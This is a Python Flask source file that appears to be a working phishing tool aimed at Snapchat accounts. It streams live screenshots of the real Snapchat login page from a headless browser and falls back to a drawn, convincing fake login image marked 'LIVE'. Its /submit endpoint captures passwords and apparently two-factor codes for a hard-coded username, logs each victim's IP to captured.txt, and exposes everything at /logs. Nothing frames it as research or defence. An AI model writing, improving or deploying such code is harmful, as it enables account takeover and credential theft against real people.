import os
import threading
import time
from flask import Flask, render_template, request, jsonify, send_from_directory
from datetime import datetime

app = Flask(__name__)
STATIC_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'static')
TEMPLATE_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates')
os.makedirs(STATIC_DIR, exist_ok=True)
app.template_folder = TEMPLATE_DIR

creds_log = []
HARDCODED_USER = "zexoghaith"

# Global state for the live session
session_state = {
    'started': False,
    'snapchat_loaded': False,
    'last_screenshot': None,
    'error': None
}

def create_snapchat_login_image():
    """Create a realistic Snapchat login page screenshot (used as live fallback)"""
    try:
        from PIL import Image, ImageDraw, ImageFont
        width, height = 1280, 720
        img = Image.new('RGB', (width, height), color='#000000')
        draw = ImageDraw.Draw(img)
        
        SNAP_YELLOW = '#FFFC00'
        WHITE = '#FFFFFF'
        GRAY = '#888888'
        DARK = '#111111'
        CARD = '#1F1F1F'
        FIELD = '#2A2A2A'
        
        try:
            f_title = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 48)
            f_header = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 24)
            f_field = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 17)
            f_btn = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 19)
            f_small = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 14)
        except:
            f_title = ImageFont.load_default()
            f_header = f_title
            f_field = f_title
            f_btn = f_title
            f_small = f_title
        
        # Header bar
        draw.rectangle([0, 0, width, 55], fill=DARK)
        draw.text((width//2 - 88, 7), 'Snapchat', fill=SNAP_YELLOW, font=f_title)
        
        # Centered login card
        cw, ch = 410, 490
        cx = (width - cw) // 2
        cy = 78
        draw.rounded_rectangle([cx, cy, cx+cw, cy+ch], radius=20, fill=CARD)
        
        draw.text((cx + 25, cy + 20), 'Log in to Snapchat', fill=WHITE, font=f_header)
        
        # Input fields
        draw.rounded_rectangle([cx+25, cy+62, cx+cw-25, cy+102], radius=10, fill=FIELD)
        draw.text((cx + 38, cy + 72), 'Username or email', fill=GRAY, font=f_field)
        
        draw.rounded_rectangle([cx+25, cy+115, cx+cw-25, cy+155], radius=10, fill=FIELD)
        draw.text((cx + 38, cy + 125), 'Password', fill=GRAY, font=f_field)
        
        # Big yellow Log In button
        by = cy + 180
        draw.rounded_rectangle([cx+25, by, cx+cw-25, by+48], radius=26, fill=SNAP_YELLOW)
        draw.text((cx + 148, by + 12), 'Log In', fill='#000000', font=f_btn)
        
        draw.text((cx + 180, by + 62), 'or', fill='#555555', font=f_small)
        
        # Social buttons
        draw.rounded_rectangle([cx+25, by+90, cx+cw-25, by+132], radius=26, fill=FIELD)
        draw.text((cx + 90, by + 101), 'Continue with Google', fill=WHITE, font=f_small)
        
        draw.rounded_rectangle([cx+25, by+145, cx+cw-25, by+187], radius=26, fill=FIELD)
        draw.text((cx + 95, by + 156), 'Continue with Apple', fill=WHITE, font=f_small)
        
        draw.text((cx + 95, cy + 410), 'Forgot your password?', fill='#666666', font=f_small)
        
        # LIVE badge
        draw.rounded_rectangle([width-160, 12, width-15, 42], radius=13, fill='#22c55e')
        draw.text((width-142, 16), '●  LIVE', fill='#000000', font=f_small)
        
        # Live footer with timestamp
        now = datetime.now().strftime('%H:%M:%S')
        draw.text((20, height-32), f'Session active — Snapchat login page  •  {now}', fill='#22c55e', font=f_small)
        
        path = os.path.join(STATIC_DIR, 'screenshot.png')
        img.save(path, 'PNG')
        return True
    except Exception as e:
        print(f"  create_snapchat_login_image error: {e}")
        return False

def screenshot_loop():
    global session_state
    try:
        from playwright.sync_api import sync_playwright
        print("[SESSION] Initializing browser...")
        
        with sync_playwright() as p:
            browser = p.chromium.launch(
                headless=True,
                args=[
                    '--no-sandbox',
                    '--disable-setuid-sandbox',
                    '--disable-dev-shm-usage',
                    '--disable-blink-features=AutomationControlled',
                    '--disable-gpu',
                    '--no-first-run',
                    '--disable-extensions',
                    '--disable-web-security',
                    '--disable-features=VizDisplayCompositor'
                ]
            )
            context = browser.new_context(
                viewport={'width': 1280, 'height': 720},
                user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
                ignore_https_errors=True
            )
            page = context.new_page()
            
            print("[SESSION] Navigating to Snapchat login page...")
            page.goto(
                'https://accounts.snapchat.com/accounts/login', 
                wait_until='networkidle', 
                timeout=120000
            )
            
            session_state['started'] = True
            session_state['snapchat_loaded'] = True
            session_state['error'] = None
            
            print("✅ [SESSION] Session started successfully — Snapchat login page is now LIVE")
            
            time.sleep(2.5)
            
            path = os.path.join(STATIC_DIR, 'screenshot.png')
            page.screenshot(path=path, full_page=False)
            session_state['last_screenshot'] = datetime.now().isoformat()
            print(f"[SESSION] Initial live screenshot captured")
            
            while True:
                try:
                    page.screenshot(path=path, full_page=False)
                    session_state['last_screenshot'] = datetime.now().isoformat()
                except Exception as e:
                    print(f"[SESSION] screenshot error: {e}")
                    session_state['error'] = str(e)
                time.sleep(1.2)
                
    except Exception as e:
        print(f"❌ [SESSION] Playwright failed (using fallback): {e}")
        session_state['error'] = str(e)
        session_state['started'] = True
        session_state['snapchat_loaded'] = False
        
        # Create realistic Snapchat login image immediately
        create_snapchat_login_image()
        print("[SESSION] Using realistic Snapchat login page (fallback mode)")
        
        # Keep the fallback image "live" by updating the timestamp every second
        path = os.path.join(STATIC_DIR, 'screenshot.png')
        while True:
            try:
                create_snapchat_login_image()  # regenerate with new timestamp
                session_state['last_screenshot'] = datetime.now().isoformat()
            except:
                pass
            time.sleep(1.5)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    data = request.get_json()
    entry = {
        'user': HARDCODED_USER,
        'pass': data.get('password'),
        'code': data.get('code'),
        'ip': request.remote_addr,
        'time': datetime.now().isoformat()
    }
    creds_log.append(entry)
    log_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'captured.txt')
    with open(log_path, 'a') as f:
        f.write(f"{entry}\n")
    return jsonify({'status': 'ok'})

@app.route('/logs')
def logs():
    return jsonify(creds_log)

@app.route('/screenshot')
def screenshot():
    path = os.path.join(STATIC_DIR, 'screenshot.png')
    if os.path.exists(path):
        # Add cache-busting headers
        response = send_from_directory(STATIC_DIR, 'screenshot.png')
        response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
        return response
    # Fallback placeholder
    from PIL import Image
    img = Image.new('RGB', (1280, 720), color=(40, 40, 60))
    img.save(path)
    return send_from_directory(STATIC_DIR, 'screenshot.png')

@app.route('/status')
def status():
    path = os.path.join(STATIC_DIR, 'screenshot.png')
    size = os.path.getsize(path) if os.path.exists(path) else 0
    return jsonify({
        **session_state,
        'screenshot_exists': os.path.exists(path),
        'screenshot_size': size,
        'timestamp': datetime.now().isoformat()
    })

@app.before_request
def init_screenshot():
    if not hasattr(app, 'screenshot_started'):
        app.screenshot_started = True
        t = threading.Thread(target=screenshot_loop, daemon=True)
        t.start()
        print("[APP] Screenshot thread started — waiting for Snapchat login page...")

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
